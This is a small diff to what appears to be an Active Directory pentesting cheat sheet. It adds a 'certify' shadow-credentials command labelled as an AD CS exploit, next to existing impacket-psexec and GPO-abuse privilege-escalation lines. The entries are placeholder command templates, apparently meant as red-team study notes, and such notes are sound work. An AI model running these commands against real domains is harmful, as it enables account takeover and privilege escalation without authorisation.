@@ -181,3 +181,8 @@ impacket-psexec -no-pass -k <FQDN(computername.domain.name)>
 gpupdate /force
 ```
 - https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7
+---
+# certify(AD CS exploit)
+```bash
+certify shadow auto -u <user> -p <password> -account <account> -dc-ip <ip>
+```
